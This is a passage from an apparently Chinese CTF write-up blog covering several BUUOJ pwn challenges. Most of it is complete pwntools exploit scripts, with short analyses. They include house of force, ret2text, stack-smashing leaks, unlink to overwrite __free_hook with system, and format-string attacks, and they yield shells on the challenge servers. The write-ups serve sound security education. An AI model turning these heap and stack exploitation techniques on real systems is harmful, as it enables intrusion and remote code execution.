*</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">p_name = <span class="string">&#x27;./gyctf_2020_force&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">25534</span>)<span class="comment">#process(p_name)#</span></span><br><span class="line">e = ELF(p_name)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/arttnba3/Desktop/CTF/libc/64bit/libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;2:puts&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;size&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;bin addr &quot;</span>)</span><br><span class="line">    chunk_addr = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop = <span class="literal">True</span>), <span class="number">16</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;content&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line">    <span class="keyword">return</span> chunk_addr</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    libc_leak = new(<span class="number">0x2000000</span>, <span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    libc_base = libc_leak - <span class="number">0x10</span> + <span class="number">0x2000000</span> + <span class="number">0x1000</span> <span class="comment"># chunk header</span></span><br><span class="line">    log.success(<span class="string">&#x27;libc base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">    heap_leak = new(<span class="number">0x10</span>, <span class="string">b&#x27;arttnba3&#x27;</span> * <span class="number">2</span> + p64(<span class="number">0</span>) + p64(<span class="number">0xfffffffffffffff1</span>))</span><br><span class="line">    top_chunk = heap_leak + <span class="number">0x10</span></span><br><span class="line">    log.success(<span class="string">&#x27;top chunk: &#x27;</span> + <span class="built_in">hex</span>(top_chunk))</span><br><span class="line"></span><br><span class="line">    new(libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] - top_chunk - <span class="number">0x30</span>, <span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">b&#x27;arttnba3&#x27;</span> + p64(libc_base + <span class="number">0x4526a</span>) + p64(libc_base + libc.sym[<span class="string">&#x27;__libc_realloc&#x27;</span>] + <span class="number">0x10</span>))</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;2:puts&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;size&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">0x10</span>).encode())</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>

<p>运行即可 get shell</p>
<p><img src="https://i.loli.net/2021/05/03/hG4lYofbJRq7aKr.png" alt="image.png"></p>
<h2 id="0x060-suctf-2018-basic-pwn-ret2text-ret2csu"><a href="#0x060-suctf-2018-basic-pwn-ret2text-ret2csu" class="headerlink" title="0x060.suctf_2018_basic pwn - ret2text + ret2csu"></a>0x060.suctf_2018_basic pwn - ret2text + ret2csu</h2><p>惯例的 <code>checksec</code>，开了 NX 和 RELRO</p>
<p><img src="https://i.loli.net/2021/05/03/IEVQ3PTSmhp61cH.png" alt="image.png"></p>
<p>拖入 IDA 进行分析，直接就有个很大的溢出</p>
<p><img src="https://i.loli.net/2021/05/03/TUW8FzcrbGpHexA.png" alt="image.png"></p>
<p>有个拿flag的后门，直接 ret2text</p>
<p><img src="https://i.loli.net/2021/05/03/BZdXgjl1bsyS2Vr.png" alt="image.png"></p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p_name = <span class="string">&#x27;./SUCTF_2018_basic_pwn&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26176</span>)<span class="comment">#process(p_name)#</span></span><br><span class="line">e = ELF(p_name)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/arttnba3/Desktop/CTF/libc/64bit/libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x110</span></span><br><span class="line">pop_rdi_ret = e.search(asm(<span class="string">&#x27;pop rdi ; ret&#x27;</span>)).__next__()</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;A&#x27;</span> * offset + p64(<span class="number">0xdeadbeef</span>) + p64(<span class="number">0x401157</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行即可 get flag</p>
<p><img src="https://i.loli.net/2021/05/03/RwKjrXec9pPlLWB.png" alt="image.png"></p>
<h1 id="0x061-0x070"><a href="#0x061-0x070" class="headerlink" title="0x061 ~ 0x070"></a>0x061 ~ 0x070</h1><blockquote>
<p>正式进入第四页啦！</p>
</blockquote>
<h2 id="0x061-wustctf2020-name-your-cat-write-out-of-bound"><a href="#0x061-wustctf2020-name-your-cat-write-out-of-bound" class="headerlink" title="0x061.wustctf2020_name_your_cat - write out of bound"></a>0x061.wustctf2020_name_your_cat - write out of bound</h2><p>惯例的 <code>checksec</code> ，开了 NX 和 canary</p>
<p><img src="https://i.loli.net/2021/05/03/ep9Ha7D1Ux8rWbJ.png" alt="image.png"></p>
<p>拖入 IDA 进行分析</p>
<p>存在数组越界</p>
<p><img src="https://i.loli.net/2021/05/03/Au2XNjzYTCp8bgQ.png" alt="image.png"></p>
<p><img src="https://i.loli.net/2021/05/03/q9iJsW1v6VNlgYM.png" alt="image.png"></p>
<p>给了个后门</p>
<p><img src="https://i.loli.net/2021/05/03/Q1CZxgdrlqpVans.png" alt="image.png"></p>
<p>改 main 的返回地址为后门即可</p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p_name = <span class="string">&#x27;./wustctf2020_name_your_cat&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29927</span>)<span class="comment">#process(p_name)#</span></span><br><span class="line">e = ELF(p_name)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/arttnba3/Desktop/CTF/libc/64bit/libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">index, content</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Name for which?\n&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Give your name plz: &quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        new(<span class="number">7</span>, p32(<span class="number">0x80485CB</span>))</span><br><span class="line">    </span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>

<p>运行即可 get shell</p>
<p><img src="https://i.loli.net/2021/05/03/67yrJh4mMEcSNU8.png" alt="image.png"></p>
<h2 id="0x062-wdb2018-guess-Stack-Smashing-Protect-leak"><a href="#0x062-wdb2018-guess-Stack-Smashing-Protect-leak" class="headerlink" title="0x062.wdb2018_guess - Stack Smashing Protect leak"></a>0x062.wdb2018_guess - Stack Smashing Protect leak</h2><p>惯例的 <code>checksec</code> ，开了 NX 和 canary</p>
<p><img src="https://i.loli.net/2021/05/03/jNPlIGzZ7uxVDLn.png" alt="image.png"></p>
<p>拖入 IDA 进行分析</p>
<p>有 gets()，有个 fork() 可以输入三次，但是没有常规的输出，似乎没法直接绕canary</p>
<p><img src="https://i.loli.net/2021/05/03/zroSDdaZ85CXk7e.png" alt="image.png"></p>
<p>既然 flag 已经被读到栈上了，那么我们可以想办法把 flag 给输出出来</p>
<p>考虑到 <code>__stack_chk_fail()</code> 的代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// debug/stack_chk_fail.c</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line">__attribute__ ((<span class="keyword">noreturn</span>))</span><br><span class="line">__stack_chk_fail (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  __fortify_fail_abort (<span class="literal">false</span>, <span class="string">&quot;stack smashing detected&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">strong_alias (__stack_chk_fail, __stack_chk_fail_local)</span><br><span class="line"></span><br><span class="line"><span class="comment">// debug/fortify_fail.c</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line">__attribute__ ((<span class="keyword">noreturn</span>))</span><br><span class="line">__fortify_fail_abort (<span class="type">_Bool</span> need_backtrace, <span class="type">const</span> <span class="type">char</span> *msg)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* The loop is added only to keep gcc happy.  Don&#x27;t pass down</span></span><br><span class="line"><span class="comment">     __libc_argv[0] if we aren&#x27;t doing backtrace since __libc_argv[0]</span></span><br><span class="line"><span class="comment">     may point to the corrupted stack.  */</span></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    __libc_message (need_backtrace ? (do_abort | do_backtrace) : do_abort,</span><br><span class="line">		    <span class="string">&quot;*** %s ***: %s terminated\n&quot;</span>,</span><br><span class="line">		    msg,</span><br><span class="line">		    (need_backtrace &amp;&amp; __libc_argv[<span class="number">0</span>] != <span class="literal">NULL</span></span><br><span class="line">		     ? __libc_argv[<span class="number">0</span>] : <span class="string">&quot;&lt;unknown&gt;&quot;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当 <code>__libc_argv[0]</code> 不为 NULL 时会作为字符串进行输出</p>
<p>动态调试可以发现其位于栈上，不难想到我们可以通过溢出将其覆盖，以泄漏出我们所需要的数据；其偏移同样可以通过动态调试获得，需要注意的是应当使用相同版本的 libc 进行调试</p>
<p><img src="https://i.loli.net/2021/05/04/YZRozWTs5aGXxPr.png" alt="image.png"></p>
<p>由于仅有三次输出机会，考虑第一次通过 got 表泄漏出 libc 基址，第二次通过 <code>__environ</code> 泄漏出栈地址，<strong>最后泄漏出flag</strong></p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p_name = <span class="string">&#x27;./GUESS&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">29134</span>)<span class="comment">#process(p_name)#</span></span><br><span class="line">e = ELF(p_name)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/arttnba3/Desktop/CTF/libc/64bit/libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x128</span></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;A&#x27;</span> * offset + p64(e.got[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;libc base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;A&#x27;</span> * offset + p64(libc_base + libc.sym[<span class="string">&#x27;__environ&#x27;</span>]))</span><br><span class="line">stack_leak = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&#x27;stack leak: &#x27;</span> + <span class="built_in">hex</span>(stack_leak))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;A&#x27;</span> * offset + p64(stack_leak - <span class="number">0x168</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行即可获得 flag</p>
<p><img src="https://i.loli.net/2021/05/04/QBDcYzUbmptiwgI.png" alt="image.png"></p>
<h2 id="0x063-zctf2016-note2-Interger-Overflow-unlink"><a href="#0x063-zctf2016-note2-Interger-Overflow-unlink" class="headerlink" title="0x063.zctf2016_note2 - Interger Overflow + unlink"></a>0x063.zctf2016_note2 - Interger Overflow + unlink</h2><p>惯例的 <code>checksec</code> ，只开了 NX 和 canary</p>
<p><img src="https://i.loli.net/2021/05/08/CyMJlO6QFxIDVEi.png" alt="image.png"></p>
<p>拖入 IDA 进行分析</p>
<p>大概是有着创建、打印、编辑、释放堆块的功能</p>
<p>限制了只能够分配四个堆块，大小刚好卡 0x80 的线，可以拿到 unsorted bin</p>
<p><img src="https://i.loli.net/2021/05/08/EfyYtJCm3ilM4Zj.png" alt="image.png"></p>
<p>漏洞点主要在于其自定义的读取输入的函数中，在循环比较中的 i 为 unsigned 类型，因此比较时便会都转为 unsigned 类型进行比较，若是 size 为 0 则 size - 1 会变为一个很大的数，<strong>存在溢出</strong></p>
<p><img src="https://i.loli.net/2021/05/08/HqKmWjLh8UNnEgw.png" alt="image.png"></p>
<p>只能分配四个堆块，空间比较紧张，考虑 unlink 劫持指针数组后通过 got 表泄露 libc 后改 free hook 一套带走</p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p_name = <span class="string">&#x27;./note2&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">28871</span>)<span class="comment">#process(p_name)#</span></span><br><span class="line">e = ELF(p_name)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/arttnba3/Desktop/CTF/libc/64bit/libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">command:<span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;option---&gt;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(command).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Input the length of the note content:(less than 128)&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Input the note content:&quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Input the id of the note:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Content is &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index:<span class="built_in">int</span>, mode:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Input the id of the note:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;do you want to overwrite or append?[1.overwrite/2.append]&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(mode).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;TheNewContents:&quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Input the id of the note:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    p.sendline(<span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    new(<span class="number">0x20</span>, <span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    new(<span class="number">0x80</span>, <span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    edit(<span class="number">2</span>, <span class="number">1</span>, <span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    new(<span class="number">0</span>, <span class="string">b&#x27;arttnba3&#x27;</span> * <span class="number">2</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(<span class="number">0x602120</span> + <span class="number">8</span> - <span class="number">0x18</span>) + p64(<span class="number">0x602120</span> + <span class="number">8</span> - <span class="number">0x10</span>) + p64(<span class="number">0x20</span>) + p64(<span class="number">0x90</span>))</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    edit(<span class="number">1</span>, <span class="number">1</span>, <span class="string">b&#x27;arttnba3&#x27;</span> * <span class="number">2</span> + p64(e.got[<span class="string">&#x27;free&#x27;</span>]))</span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    libc_base = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - libc.sym[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">    log.success(<span class="string">&#x27;libc base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">    edit(<span class="number">1</span>, <span class="number">1</span>, <span class="string">b&#x27;arttnba3&#x27;</span> * <span class="number">2</span> + p64(libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]))</span><br><span class="line">    edit(<span class="number">0</span>, <span class="number">1</span>, p64(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">    edit(<span class="number">1</span>, <span class="number">1</span>, <span class="string">b&#x27;arttnba3&#x27;</span> * <span class="number">2</span> + p64(libc_base + libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>).__next__()))</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>运行即可 get shell</p>
<p><img src="https://i.loli.net/2021/05/08/KroQAfGF9Wk4Yv1.png" alt="image.png"></p>
<h2 id="0x064-护网杯-2018-gettingstart-Overflow"><a href="#0x064-护网杯-2018-gettingstart-Overflow" class="headerlink" title="0x064.护网杯_2018_gettingstart - Overflow"></a>0x064.护网杯_2018_gettingstart - Overflow</h2><p>拖入 IDA 进行分析</p>
<p>溢出改两个值即可拿 shell</p>
<p><img src="https://i.loli.net/2021/05/08/nkW7gFRcE9qzjD2.png" alt="imaeg.png"></p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">28688</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x18</span> + p64(<span class="number">0x7FFFFFFFFFFFFFFF</span>) + p64(<span class="number">0x3FB999999999999A</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行即可 get shell</p>
<p><img src="https://i.loli.net/2021/05/08/hQ1lViW6xfOKTHp.png" alt="image.png"></p>
<h2 id="0x065-wustctf2020-number-game"><a href="#0x065-wustctf2020-number-game" class="headerlink" title="0x065.wustctf2020_number_game"></a>0x065.wustctf2020_number_game</h2><p>拖入 IDA 进行分析</p>
<p>读一个数，要她本身小于等于 0 且 其取负值同样小于等于 0</p>
<p><img src="https://i.loli.net/2021/05/08/CDsAHl3Wmq9RFQo.png" alt="image.png"></p>
<p>考虑 0x80000000，其本身为负数，取反码 + 1 还是负数</p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">27318</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="built_in">str</span>(-<span class="number">0x80000000</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行即可 get shell</p>
<p><img src="https://i.loli.net/2021/05/08/nqA9NubdoTzZSD2.png" alt="image.png"></p>
<h2 id="0x066-gyctf-2020-some-thing-interesting-fmtstr-heap-fengshui"><a href="#0x066-gyctf-2020-some-thing-interesting-fmtstr-heap-fengshui" class="headerlink" title="0x066.gyctf_2020_some_thing_interesting - fmtstr + heap fengshui"></a>0x066.gyctf_2020_some_thing_interesting - fmtstr + heap fengshui</h2><p>惯例的 <code>checksec</code>，保护全开</p>
<p><img src="https://i.loli.net/2021/05/08/uDpcw1BxtlgU4Vi.png" alt="image.png"></p>
<p>拖入 IDA 进行分析</p>
<p>一开始会让你输入一个字符串并验证，但是只比较前 0xE 个字符</p>
<p><img src="https://i.loli.net/2021/05/08/SwsrCdyuYHjmOXM.png" alt="image.png"></p>
<p>大概有着打印初始字符串、创建、修改、释放、打印堆块的功能</p>
<p><img src="https://i.loli.net/2021/05/08/Klb5Mjz1fiOEDan.png" alt="image.png"></p>
<p>存在一个格式化字符串漏洞</p>
<p><img src="https://i.loli.net/2021/05/08/1kfMqJVdjX2WtBe.png" alt="image.png"></p>
<p>一次可以分配两个 chunk， 但是限制了大小，似乎没法直接拿 unsorted</p>
<p><img src="https://i.loli.net/2021/05/08/Z8nI216umoASfFv.png" alt="image.png"></p>
<p>有一个裸的 UAF</p>
<p><img src="https://i.loli.net/2021/05/08/esRcMFojZVEN3Sh.png" alt="image.png"></p>
<p>利用格式字符串泄漏出位于栈上的 libc 相关地址以获得 libc 基址后改 malloc hook 为 one_gadget 即可</p>
<p>exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.arch 